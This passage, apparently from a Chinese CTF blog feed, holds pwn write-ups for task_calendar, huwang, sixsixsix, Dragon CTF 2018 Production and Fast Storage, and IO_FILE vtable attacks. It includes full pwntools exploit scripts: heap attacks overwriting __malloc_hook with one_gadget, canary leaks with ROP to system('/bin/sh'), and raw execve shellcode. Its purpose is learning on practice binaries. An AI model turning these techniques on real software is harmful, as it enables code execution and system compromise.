malloc_hook-0x23add(0,0x60) #point to 3's chunkadd(0,0x60) #point to 1's chunkadd(0,0x60) #point to malloc_hook-0x23 这一系列操作结束后，addr_list[0]里存放的是malloc_hook-0x23的地址。 unsorted bin attack 构造unsorted bin的方法和第一步相同，为了利用unsorted bin attack，修改BK的值为malloc_hook-0x10，根据以往的经验，malloc_hook都是以0xb10结尾的，malloc_hook-0x10则是以0xb00结尾，因此输入\n使之变为\x00。 需要注意的是，当unsorted bin的size大于要分配的size并且为last_remainder时，只对unsorted bin进行切分而不会解链操作。而本题中，最开始我没有再修改unsorted bin的size，使之大于要分配的fastbin的大小，但这个unsorted bin并不是last remainder，因此会把它放到对应的smallbin里并检查FD对应的chunk，而由于FD已经被修改了，引起了malloc_printerr。所以要再次修改unsorted bin的size。 123456789101112add(1,24)add(2,0x50)add(3,0x50)add(3,0x50)edit(1,24,'0'*24+'\xc1')remove(2)bytes = (get_base(p)+libc.symbols['__malloc_hook'])&amp;0xffffedit(2,8,'a'*8+'\n')edit(1,24,'0'*24+'\x61')add(3,0x50) 12345678910111213141516// _int_malloc()函数 if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); //只是修改头的fd和bk，没有解链 unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); …… return p; &#125; ​ 写入one_gadget 12bytes = (get_base(p)+gadget[2])&amp;0xffffffedit(0,21,19*&apos;a&apos;+p32(bytes)[:-1]) ​ 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.log_level='debug'gadget =[0x45216,0x4526a,0xf02a4,0xf1147]p = process('./task_calendar')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def get_base(p): f = open('/proc/'+str(pidof(p)[0])+'/maps','r') while 1: tmp = f.readline() print tmp if 'libc-2.23.so' in tmp: libc_addr = int('0x'+tmp.split('-')[0],16) f.close() break log.info("libc_addr:%#x",libc_addr) return libc_addrdef add(day,size): p.sendlineafter("4. exit\nchoice&gt; ",'1') p.sendlineafter("7. Sunday\nchoice&gt; ",str(day+1)) p.sendlineafter("size&gt; ",str(size))def edit(day,size,info): p.sendlineafter("4. exit\nchoice&gt; ",'2') p.sendlineafter("7. Sunday\nchoice&gt; ",str(day+1)) p.sendlineafter("size&gt; ",str(size)) p.sendafter("info&gt; ",info)def remove(day): p.sendlineafter("4. exit\nchoice&gt; ",'3') p.sendlineafter("7. Sunday\nchoice&gt; ",str(day+1))#libc_base = get_base(p)&amp;0xffffp.sendlineafter("input calendar name&gt; ",'0gur1')add(0,0x60)# 0x00add(0,0x60)# 0x70add(0,24) # 0xe0 add(1,0x60)# 0x100add(2,0x60)# 0x170add(3,0x60)# 0x1e0#overwrite #1's size to an unsorted bin sizeedit(0,24,'0'*24+'\xe1')remove(1)add(0,0x60)add(0,0x60)#now #1's chunk(0x100) is in the unsorted bin#fastbin attackremove(2)remove(3)edit(3,1,'\n')#now there are 3 chunks in fastbin:#3-&gt;#1-&gt;main_aren+88#make:#3-&gt;#0-&gt;malloc_hook-0x23bytes = (get_base(p)+libc.symbols['__malloc_hook']-0x23)&amp;0xfffflog.info("bytes:%#x",bytes)edit(1,1,p32(bytes)[:-2])add(0,0x60)#point to 3's chunkadd(0,0x60)#point to 1's chunkadd(0,0x60)#point to malloc_hook-0x23#edit(0,18,'a'*3+p64(0)+p64(0x7f))#using unsorted bin attack to overwrite add(1,24)add(2,0x50)add(3,0x50)add(3,0x50)edit(1,24,'0'*24+'\xc1')remove(2)gdb.attach(p)bytes = (get_base(p)+libc.symbols['__malloc_hook'])&amp;0xffffedit(2,8,'a'*8+'\n')edit(1,24,'0'*24+'\x61')add(3,0x50)#change main_arena+88 to one_gadgetbytes = (get_base(p)+gadget[2])&amp;0xffffffedit(0,21,19*'a'+p32(bytes)[:-1])#gdb.attach(p)add(2,0x20)p.interactive() huwang通过这题学习了一些新的知识，算是查缺补漏了。 基本逻辑这题主要的功能都在一个函数里，用来猜secret。secret的组成是读取/dev/random中的随机数，对每个字节做&amp;1的操作，然后再使用MD5计算hash： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980void __noreturn secret()&#123; int v0; // ST04_4 __int64 v1; // [rsp+0h] [rbp-80h] __int64 v2; // [rsp+0h] [rbp-80h] signed int i; // [rsp+0h] [rbp-80h] int v4; // [rsp+4h] [rbp-7Ch] int fd; // [rsp+8h] [rbp-78h] int fda; // [rsp+8h] [rbp-78h] int v7; // [rsp+Ch] [rbp-74h] char v8; // [rsp+10h] [rbp-70h] char s[32]; // [rsp+20h] [rbp-60h] char s1; // [rsp+40h] [rbp-40h] char buf; // [rsp+60h] [rbp-20h] unsigned __int64 v12; // [rsp+78h] [rbp-8h] v12 = __readfsqword(0x28u); puts("please input your name"); read(0, &amp;buf, 0x20uLL); memset(s, 0, 0x10uLL); puts("Do you want to guess the secret?"); read_one_by_one(&amp;v8, 2LL); if ( v8 == 'y' ) &#123; if ( access("/tmp/secret", 0) == -1 ) // check if the file exist or not &#123; HIDWORD(v1) = open("/tmp/secret", 65, 511LL); fd = open("/dev/urandom", 0); // secret comes from random read(fd, s, 0xCuLL); LODWORD(v1) = 0; while ( (signed int)v1 &lt;= 11 ) &#123; s[(signed int)v1] &amp;= 1u; LODWORD(v1) = v1 + 1; &#125; write(SHIDWORD(v1), s, 0xCuLL); close(SHIDWORD(v1)); close(fd); &#125; v0 = open("/tmp/secret", 0, v1); read(v0, s, 0xCuLL); close(v0); puts("Input how many rounds do you want to encrypt the secret:"); v7 = read_int(); if ( v7 &gt; 10 ) &#123; puts("What? Why do you need to encrypt so many times?"); exit(-1); &#125; if ( !v7 ) &#123; printf("At least encrypt one time", s); exit(-1); &#125; HIDWORD(v2) = open("/tmp/secret", 513); LODWORD(v2) = 0; while ( (unsigned int)v2 &lt; v7 ) &#123; MD5((__int64)s, 16LL, (__int64)s); //md5(secret) LODWORD(v2) = v2 + 1; &#125; write(SHIDWORD(v2), s, 0x10uLL); close(SHIDWORD(v2)); puts("Try to guess the md5 of the secret"); read(0, &amp;s1, 0x10uLL); if ( !memcmp(&amp;s1, s, 0x10uLL) ) right((__int64)&amp;buf); v4 = open("/tmp/secret", 513, 511LL, v2); fda = open("/dev/urandom", 0); read(fda, s, 0xCuLL); for ( i = 0; i &lt;= 11; ++i ) s[i] &amp;= 1u; write(v4, s, 0xCuLL); close(v4); close(fda); exit(0); &#125; printf("Oh!bye %s\n", &amp;buf); exit(0);&#125; 如果猜对了secret，进到right函数，right函数会输出一些信息。 12345678910111213141516171819202122232425262728int __fastcall right(__int64 name)&#123; char v1; // ST1B_1 int v3; // [rsp+1Ch] [rbp-214h] char job; // [rsp+20h] [rbp-210h] char s; // [rsp+120h] [rbp-110h] unsigned __int64 v6; // [rsp+228h] [rbp-8h] v6 = __readfsqword(0x28u); printf("Congratulations, %s guessed my secret!\n", name); puts("And I want to know someting about you, and introduce you to other people who guess the secret!"); puts("What`s your occupation?"); read_one_by_one(&amp;job, 255LL); v3 = snprintf( &amp;s, 0xFFuLL, "I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome........." ".................................................................................................", name, &amp;job); puts("Here is your introduce"); puts(&amp;s); puts("Do you want to edit you introduce by yourself[Y/N]"); v1 = getchar(); getchar(); if ( v1 == 'Y' ) read(0, &amp;s, v3 - 1); return printf("The final presentation is as follows:%s\n", &amp;s);&#125; bug首先给自己普及几个知识点： snprintf中虽然限制了写入的size，但是返回值是要写入的字节数量，如snprintf(&amp;s,5,”1234567890”);的返回值为10，s中内容为“12345”。 程序中虽然开启了canary保护，但是一个程序中每个函数栈帧压入的canary的值是相同的，而且多以\x00结尾，以防止泄露canary之后的内容。 当用O_WRONLY模式打开文件时，如果文件已存在，其中的内容会被清空。 在right函数里，最后一个read以snprintf的返回值作为参数，存在栈溢出漏洞，可以构造ROP；在secret函数中输入encrypt round时，虽然限制了不能大于10且不能等于0，但对负数未做检查，而在md5运算的循环里，将round转换为unsigned int进行比较，即整数溢出漏洞。 漏洞利用构造ROP之前，需要先解决canary的问题，在secret中，允许向rbp-0x20中的buf读入0x20个字节，canary位于rbp-0x8，如果我们不输入\x00，就会泄露canary的值。另外，为了解决canary中有\x00无法泄露的问题，向buf中输入0x19个字节，覆盖住canary的\x00，就能在right函数中读取另外的七个字节。 最关键还是要解决如何进入到right函数中。利用整数溢出漏洞，round输入-1，由于转换为unsigned int非常大，会造成timeout，注意到此处open的oflag是513，即O_WROLY|O_CREATE，打开之后文件中内容已经被清空，而又由于timeout而退出，并没有像文件内写入内容，此时文件为空。对空值做MD5就是我们可预测的了。 123456789HIDWORD(v2) = open("/tmp/secret", 513); LODWORD(v2) = 0; while ( (unsigned int)v2 &lt; v7 ) &#123; MD5((__int64)s, 16LL, (__int64)s); //md5(secret) LODWORD(v2) = v2 + 1; &#125; write(SHIDWORD(v2), s, 0x10uLL); close(SHIDWORD(v2)); 利用脚本脚本参考的是w1cher大佬的wp，可惜大佬不公开blog。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level='debug'libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def secret(name,rounds,md5,flag=1): p.sendlineafter("command&gt;&gt; \n",'666') p.sendafter("please input your name\n",name) p.sendlineafter("Do you want to guess the secret?\n",'y') p.sendlineafter("Input how many rounds do you want to encrypt the secret:\n",str(rounds)) if flag: p.sendafter("Try to guess the md5 of the secret\n",md5)#make the secret file empty by timeoutp = process('./4_huwang')secret('a'*0x20,-1,'0',0)p.recvuntil('timeout~')#leak canaryp = process('./4_huwang')secret('0gur1'.ljust(0x19,'a'),1,'4ae71336e44bf9bf79d2752e234818a5'.decode('hex'))p.recvuntil("0gur1".ljust(0x19,'a'))canary = u64('\x00'+p.recv(7))log.info("canary:%#x",canary)#rop1 leak libcpop_ret_addr = 0x401573puts_got = 0x602F70right_addr = 0x40101Cp.sendafter("What`s your occupation?\n",'a'*0xff)p.sendlineafter("Do you want to edit you introduce by yourself[Y/N]\n",'Y')shellcode = 'a'*0x108+p64(canary)+p64(0)shellcode+= p64(pop_ret_addr)+p64(puts_got)+p64(right_addr)gdb.attach(p)p.sendline(shellcode)p.recvuntil("Congratulations, ")puts_addr = u64(p.recv(6).ljust(8,'\x00'))log.info("puts_addr:%#x",puts_addr)sys_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])binsh_addr = puts_addr - (libc.symbols['puts']-next(libc.search('/bin/sh')))#rop2 getshellp.sendafter("What`s your occupation?\n",'a'*0xff)p.sendlineafter("Do you want to edit you introduce by yourself[Y/N]\n",'Y')shellcode = 'a'*0x108+p64(canary)+p64(0)shellcode+= p64(pop_ret_addr)+p64(binsh_addr)+p64(sys_addr)p.sendline(shellcode)p.interactive() six本题用mmap分配了两块内存，分别模拟.text段和栈，向.text内写入shellcode并执行。 因为这两块内存都是随机的，如果指定的地址出现冲突后，mmap会进行随机分配，这时候就会是相邻的两块。如果代表栈的那一块内存在代表.text之前，就可以通过调用read向栈中写入数据并用shell覆盖掉.text即将执行的指令即可。 12345678910111213141516171819from pwn import *context.log_level='debug'p = process('./sixsixsix')gdb.attach(p)p.readuntil('shellcode:')#push rsp(0x54);pop rsi(0x5e);mov rdx,esi(0x8b,0xd6);syscall(0x0f,0x05)payload=chr(0x54)+chr(0x5e)+chr(0x8b)+chr(0xd6)+chr(0x0F)+chr(0x05)p.send(payload)z=[0xB8, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xFE, 0x48, 0x81, 0xC7, 0x4e, 0x0B, 0x00, 0x00, 0x4b, 0x48,0x33, 0xD2, 0x48,0x33, 0xF6, 0x0F, 0x05, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00]zz=''for i in range(0,len(z)): zz+=chr(z[i])payload='b'*0xb36+zzp.writeline(payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Teaser Dragon CTF 2018]]></title>
    <url>%2F2018%2F10%2F12%2FTeaser-Dragon-CTF-2018%2F</url>
    <content type="text"><![CDATA[Production这题据说是远程没有启用assert，导致文件没有close。但我当时没看出来，现在平台关闭了也试不了了TAT，就看了些大佬（Ne0 和dcua ）的wp，了解这个漏洞是怎么用的。duca的wp更细一点，两者结合更容易理解。 相关知识关于assert DESCRIPTION If the macro NDEBUG was defined at the moment was last included, the macro assert() generates no code, and hence does nothing at all. Otherwise, the macro assert() prints an error message to standard error and terminates the program by calling abort(3) if expression is false (i.e., compares equal to zero). 如果assert.h中包含了宏NDEBUG，assert将不生成代码，不执行任何操作；否则当assert中的条件不满足时，assert会输出错误并终止程序。 也就是说，如果远程assert.h中有NDEBUG，那么在read_lyrics中的关闭文件操作就不会执行： 123456789if (strstr(buffer, "DrgnS")) &#123; printf("[-] Attack detected and stopped!\n"); assert(close(globals::records[idx]) == 0); memmove(&amp;globals::records[idx], &amp;globals::records[idx + 1], (globals::records.size() - idx - 1) * sizeof(int)); globals::records.pop_back(); return true;&#125; memmove通过数组的前移实现删除，因此当读到的内容包含“DrgnS”时，只会在数组中删除元素，但文件仍处于打开状态，即fd的数量没有减少。 关于setrlimit 程序进行了一些限制，其中就包含能够打开文件描述符的最大值： 12rlim.rlim_cur = rlim.rlim_max = 32;setrlimit(RLIMIT_NOFILE, &amp;rlim); 打开的文件个数超过32个时，再通过open打开文件就会失败。观察open_lyrics的检查顺序，有两个用到open的操作位于flag之前，因此可以通过这一操作绕过flag的读取。 另外，程序中限制输入的band或者song中不能包含“../”，但是可以输入“..”绕过。 利用方法参考Ne0大佬 的思路。 在lyrics二进制文件中有“DrgnS”字符串，因此打开16次该文件（./data/../lyrics），然后读取内容，每次都读到“DrgnS”处，此时fd为18(包含0,1,2标准的输入输出)，而record数组因为memmove，元素都被删除了，size为0。 打开12个任意的文件，此时fd为30. open_lyrics ./data/../flag，在read_lyrics先是检查path是否为一个文件时，open文件，这时fd1为31，文件描述符有32个，把文件放入数组后，又检查path是否为链接文件，再次open，这时fd2=-1，并返回true。由此绕过了flag的检查 123456789101112131415161718192021222324252627282930313233// Open the path, make sure that it's a file (and not e.g. directory), and// save the file descriptor.int fd1 = open(path, O_RDONLY);if (fd1 == -1) &#123; return false;&#125;struct stat st;if (fstat(fd1, &amp;st) != 0 || !S_ISREG(st.st_mode)) &#123; return false;&#125;globals::records.push_back(fd1);// Better safe then sorry. Make sure that the path also doesn't point to a// symbolic link.int fd2 = open(path, O_RDONLY | O_NOFOLLOW);if (fd2 == -1) &#123; printf("[-] Detected attempt to open a symbolic link!\n"); // Some kind of attack detected? return true;&#125;close(fd2);// Extra check to protect the flag.if (strstr(path, "flag") != NULL) &#123; printf("[-] Not today\n"); close(globals::records.back()); globals::records.pop_back(); return false;&#125; 由于flag中也包含“DrgnS”字符串，因此无法直接打印出来。read_line_buffered中，如果读到文件结尾处会返回0，buffer中的内容不会改变。并且如果连续调用read_line_buffered时，buffer在栈上的地址保持不变，内容也就不变。因此可以先对某个文件读到结尾，再读flag，再返回读那个文件，buffer中就会保持flag中的内容。 Fast Storage这题用到了一个奇怪的点：abs(0x80000000)==0x80000000。从开始看大佬的wp到自己捋顺一共花了两天时间ORZ。 基本逻辑add，print和edit功能。 add函数输入name、size和value，并对size和value地址做简单的处理后一起存放。题目中实现了一个类似于哈希表的简单结构：对name进行哈希作为索引，出现碰撞后用next字段链接起来。 12345678910111213141516171819202122232425262728293031323334353637383940_DWORD *__fastcall add(__int64 a1, __int64 a2)&#123; int v2; // eax@1 size_t v3; // rbx@7 int v4; // eax@7 char *name; // rax@9 size_t size; // [sp+8h] [bp-128h]@1 char buf; // [sp+10h] [bp-120h]@1 char v9; // [sp+10Fh] [bp-21h]@3 void *value_addr; // [sp+110h] [bp-20h]@1 __int64 v11; // [sp+118h] [bp-18h]@1 memset(&amp;buf, 0, 0x100uLL); v11 = 0LL; size = 0LL; value_addr = 0LL; printf("Name: ", a2, &amp;buf); v2 = fileno(stdin); v11 = read(v2, &amp;buf, 0x100uLL); if ( v11 &lt;= 0 ) ouch(); v9 = 0; printf("Size: ", &amp;buf); _isoc99_scanf("%lu", &amp;size); fgetc(stdin); if ( size &gt; 0x400 ) ouch(); value_addr = malloc(size); if ( !value_addr ) ouch(); printf("Value: ", &amp;size); v3 = size; v4 = fileno(stdin); v11 = read(v4, value_addr, v3); if ( v11 &lt;= 0 ) ouch(); value_addr = (void *)((size &lt;&lt; 48) | (unsigned __int64)value_addr); name = strdup(&amp;buf); return insert_item((__int64)name, (__int64)value_addr);&#125; 其种insert_item函数是对name作一些运算并进行插入操作。我用的IDA6.8版本的就看不出来用了abs函数（当然即使看出来也不觉得有问题），据说7.0的可以直接显示。 1234567891011121314_DWORD *__fastcall insert_item(__int64 name, __int64 content)&#123; signed int v2; // ST1C_4@1 int v3; // ST18_4@1 int v4; // ST14_4@1 int idx; // ST1C_4@1 v2 = h1((_BYTE *)name); v3 = h2(name); v4 = h3((_BYTE *)name); idx = ((v2 ^ (v2 &gt;&gt; 31)) - (v2 &gt;&gt; 31)) % 62; // abs insert_idx(idx, name, content); return set_hash_bits(idx, v3, v4);&#125; 通过insert_idx函数了解到哈希链表结点的结构。 123456789101112131415161718192021222324_QWORD *__fastcall insert_idx(int idx, __int64 name, __int64 content)&#123; _QWORD *result; // rax@3 __int64 v4; // [sp+8h] [bp-28h]@1 _QWORD *v5; // [sp+28h] [bp-8h]@1 v4 = content; v5 = malloc(0x18uLL); if ( !v5 ) ouch(); v5[1] = name; v5[2] = v4; *v5 = entry[idx]; result = entry; entry[idx] = v5; return result;&#125;struct node&#123; struct node * next; char * name; char * value;&#125;; set_hash_bits函数用位运算记录h2和h3的结果： 12345678_DWORD *__fastcall set_hash_bits(int idx, char a2, char a3)&#123; _DWORD *result; // rax@1 result = bits; bits[idx] |= (1 &lt;&lt; a2) | (1 &lt;&lt; a3); return result;&#125; print和edit都是通过name定位到结点，输出或修改value的值。 find_by_name函数中同样用到了h1，h2，h3函数，并在遍历链表前先对bits[idx]进行检查，查看bits[idx]是否有对应的几个bit。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465signed __int64 __fastcall find(__int64 a1, __int64 a2)&#123; int v2; // eax@1 signed __int64 result; // rax@4 unsigned __int64 *size; // [sp+0h] [bp-120h]@1 __int64 *content_addr; // [sp+8h] [bp-118h]@1 char name; // [sp+10h] [bp-110h]@1 char v7; // [sp+10Fh] [bp-11h]@3 unsigned __int64 v8; // [sp+110h] [bp-10h]@1 __int64 v9; // [sp+118h] [bp-8h]@1 memset(&amp;name, 0, 0x100uLL); v9 = 0LL; v8 = 0LL; printf("Name: ", a2, a2, a1); v2 = fileno(stdin); v9 = read(v2, &amp;name, 0x100uLL); if ( v9 &lt;= 0 ) ouch(); v7 = 0; v8 = find_by_name(&amp;name); if ( v8 ) &#123; *size = v8 &gt;&gt; 0x30; *content_addr = v8 &amp; 0xFFFFFFFFFFFFLL; result = 1LL; &#125; else &#123; result = 0LL; &#125; return result;&#125;__int64 __fastcall find_by_name(char *name)&#123; signed int v1; // ST24_4@1 int v2; // ST20_4@1 char v3; // al@1 __int64 result; // rax@2 int idx; // [sp+24h] [bp-Ch]@1 __int64 i; // [sp+28h] [bp-8h]@3 v1 = h1(name); v2 = h2((__int64)name); v3 = h3(name); idx = ((v1 ^ (v1 &gt;&gt; 31)) - (v1 &gt;&gt; 31)) % 62; //abs if ( (unsigned int)check(idx, v2, v3) ) &#123; for ( i = entry[idx]; i &amp;&amp; strcmp(*(const char **)(i + 8), name); i = *(_QWORD *)i ) ; result = *(_QWORD *)(i + 16); &#125; else &#123; result = 0LL; &#125; return result;&#125;__int64 __fastcall check(int idx, char a2, char a3)&#123; return (((1 &lt;&lt; a2) | (1 &lt;&lt; a3)) &amp; bits[idx]) == ((1 &lt;&lt; a2) | (1 &lt;&lt; a3));&#125; bugs大佬们究竟是怎么想到的？？ abs(0x80000000)==0x80000000。验证一下： 12345678910#include&lt;stdio.h&gt;#include&lt;math.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int a = 0x80000000; printf("%d\n",a); printf("%#x\n",a^(a&gt;&gt;31)-a&gt;&gt;31); printf("%#x\n",abs(a));&#125; 输出结果： 1234./test-21474836480x800000000x80000000 如果h1(name)为0x80000000，idx = abs(0x80000000)%62=-2，在insert_idx时进行entry[idx] = node_addr时，实际上是对entry之前的数据进行操作。查看bss结构，entry[-2]即为bits[60]。 123456.bss:0000000000202040 ; _DWORD bits[64].bss:0000000000202040 bits dd 40h dup(?) ; DATA XREF: set_hash_bits+Do.bss:0000000000202040 ; set_hash_bits+3Do ....bss:0000000000202140 ; _QWORD entry[62].bss:0000000000202140 entry dq 3Eh dup(?) ; DATA XREF: insert_idx+4Ao.bss:0000000000202140 漏洞利用当输入特定的name时，会在entry[-2]即bits[60]写入堆地址，而在find_by_name中的check会对bits[60]进行检查，确定是否有某一bit，检查失败会返回”No such entry! “，利用这一点可以对bits[60]中的堆地址进行逐位泄露，方法是暴力破解。 另外，在新增结点时，bit[idx]|=1&lt;&lt;a2|1&lt;&lt;a3，通过操作a2和a3能够修改bit[idx]中的内容，即如果能够修改bit[60]中的堆地址，就相当于修改了entry[-2]的首个结点地址，控制这个堆地址中存放满足条件的name，就能泄露或者修改指定的value值。 确定特定的name，使得h1(name)为0x80000000。采用暴力破解的方法。 bit by bit 泄露堆地址，同样也是暴力破解。首先破解特定name满足：h2(name)==h3(name) &amp;&amp; abs(h1(name))%62==60(和61)，这样当a2=a3时，1&lt;&lt;a2|1&lt;&lt;a3就相当于1&lt;&lt;a2，这样就能逐位暴破堆地址了。由于bits数组是DWORD类型的，因此堆地址存放在bits[60]和bits[61]中。Linux系统中规定堆地址为6字节，且最高字节为5x，并且最低1.5字节（12bit）都是从000开始的，因此只需要破解中间的4字节即可。 泄露libc地址。采用的方法是house of orange，修改top的size，得到一个unsorted bin后泄露libc地址。修改top size的方法正如前面所述，先通过位异或修改bit[60]中的堆地址为我们构造好的地址，这个地址作为entry[-2]的首个结点，构造name满足条件，value为top size处的地址，即可通过edit修改top size。这里需要注意的是，修改后的top size需要满足 top end是页对齐的（参考sysmalloc的源码） 修改malloc_hook为one_gadget，方法同上。 利用脚本脚本我是参考EmpireCTF队伍的wp，这里就只附上暴破的简单脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *def h1(s): result = 4919; for c in s: result = result * ord(c)+1 return resultdef h2(s): result = 0 i=0 while i+1&lt;len(s) and s[i] and s[i+1] : tmp = ord(s[i+1])&lt;&lt;8 | ord(s[i]) result ^= tmp i+=2 if i&lt;len(s) and s[i]: result ^= ord(s[i]) return ((result&gt;&gt;10) ^ (result ^ (result &gt;&gt; 5))) &amp;0x1fdef h3(s): result = 0 for c in s: for i in range(8): if (ord(c)&gt;&gt;i)&amp;1: result+=1; result&amp;=0x1f; return result;#破解h1(name)==0x80000000def brute1(): for i in range(255,0,-1): print i for j in range(0,256): for k in range(0,256): for l in range(0,256): tmp = chr(i)+chr(j)+chr(k)+chr(l) if h1(tmp)%0x100000000 == 0x80000000: print tmp print "%d %d %d %d" %(i,j,k,l) return#破解h2(name)==h3(name) &amp;&amp; abs(h1(name))%62==60(和61)#i可以从2字节开始逐步增加到4字节 def brute2(): pos=&#123;&#125; for i in range(0x10000): tmp=p32(i)[:-2] a2=h2(tmp) a3=h3(tmp) if (abs(h1(tmp))%62)==60 and a2==a3: if not pos.has_key(a2): pos[a2]=1 print "%d:%#x" %(a2,u32(tmp.ljust(4,'\x00')))]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IO_FILE的利用]]></title>
    <url>%2F2018%2F09%2F25%2FIO-FILE%E7%9A%84%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[基础知识参考ctf-wiki中对FILE文件结构的介绍。其中比较重要的是_IO_FILE和_IO_jump_t两个结构体： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;void * funcs[] = &#123; 1 NULL, // "extra word" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf，puts 9 NULL, // xsgetn #scanf 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue&#125;;struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; 另外，printf和puts是对stdout进行操作的，执行时会调用vtable中的xsputn；scanf则是对stdin进行操作，调用vatbale的xsgetn。而write和read是直接进行系统调用，不会涉及vtable。 利用方式常见的利用方式有三种： 直接修改_IO_FILE_plus中的vtable指针，使其指向伪造好的函数虚表，例子：2017胖哈勃杯Ox9A82大佬出的pwn500；或者修改整个_IO_FILE_plus，伪造一个完整的FILE结构体，目的同样是操作vtable中的函数，例子：pwnable.tw seethefile。 FSOP：在调用malloc_printerr时会遍历_IO_list_all，并在满足条件时执行 _IO_OVERFLOW。通过修改_IO_OVERFLOW的地址实现利用，例子：2018 SUCTF NOTE。 修改_IO_buf_base实现对内存的写操作，例子：2018 CISCN echo 直接修改vtable/IO_FILE_plus以Ox9A82的pwn500为例，思路是通过修改global_max_fast，使得一个很大的chunk也会放在fastbin中，由于_int_free是利用idx找到fastbin的位置，当idx很大时候，能够覆盖掉stdout的vtable。 _int_free中关于fastbin的代码： 12345678910111213141516171819202122if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif ) &#123; …… free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); //计算idx: ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) unsigned int idx = fastbin_index(size); //通过idx在arena中找到对应地址 fb = &amp;fastbin (av, idx); …… &#125; 如果计算出stdout的vtable和main_arena中fastbin地址之间的距离，申请这样大小的内存，地址为addr。在free时，fb指向的就是stdout的vtable，由于在free时会修改fastbin头的FD指针，即fb-&gt;FD = addr，至此，stdout的vtable就指向了堆中的一块内存。这块内存中可以存放构造好的虚函数指针，进而获取shell。 利用脚本如下（可能由于libc的版本问题，本地并没有调通，但通过gdb的调试查看vtable已经覆写成功： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#one_gadget not successfrom pwn import *context.log_level = 'debug'p = process('./pwn500')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')gadget =[0x45216,0x4526a,0xf02a4,0xf1147]def meyer(): p.sendlineafter("Pls input your choice:\n",'1')def ponderosa(): p.sendlineafter("Pls input your choice:\n",'2')def advice(): p.sendlineafter("Pls input your choice:\n",'3')def submit(phone,addr): p.sendlineafter("Pls input your choice:\n",'4') p.sendlineafter("Pls input your phone number first:\n",phone) p.sendlineafter("Ok,Pls input your home address\n",addr)def add(): p.sendlineafter("Pls Input your choice:\n",'2')def remove(): p.sendlineafter("Pls Input your choice:\n",'3')def leave_msg(msg): p.sendlineafter("Pls Input your choice:\n",'4') p.sendlineafter("Get Input:",msg)def advice_msg(size): p.sendlineafter("4.return\n",'1') p.sendlineafter("Input size(200~8000):\n",str(size))def advice_edit(msg): p.sendlineafter("4.return\n",'2') p.sendlineafter("Input your advise\n",msg) def advice_dele(): p.sendlineafter("4.return\n",'3') submit('123456','a'*0x28)p.recvuntil('a'*0x28)atoi_addr = u64(p.recv(6).ljust(8,'\x00'))-16log.info('atoi_addr:%#x',atoi_addr)sys_addr = atoi_addr-(libc.symbols['atoi']-libc.symbols['system'])one_gadget = atoi_addr-(libc.symbols['atoi']-gadget[0])max_fast = atoi_addr-libc.symbols['atoi']+3958776meyer()add()leave_msg('a'*24+p64(max_fast))p.sendlineafter("Pls Input your 